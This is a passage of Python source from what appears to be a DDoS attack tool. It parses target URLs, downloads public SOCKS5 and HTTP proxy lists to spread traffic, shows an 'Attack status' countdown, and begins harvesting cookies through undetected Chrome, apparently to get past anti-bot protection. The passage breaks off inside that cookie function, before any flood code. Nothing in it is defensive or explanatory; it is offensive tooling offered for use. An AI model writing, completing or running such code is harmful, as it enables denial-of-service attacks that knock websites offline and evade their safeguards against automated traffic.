# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init


def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack status => " + str(
                (until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write(
                "\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack Done !                                   \n")
            return


# region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target


def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get(
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get(
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r


def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE + " You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True


def get_cookies(url):
    global useragent, cookieJar, cookie
    option = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging',
  
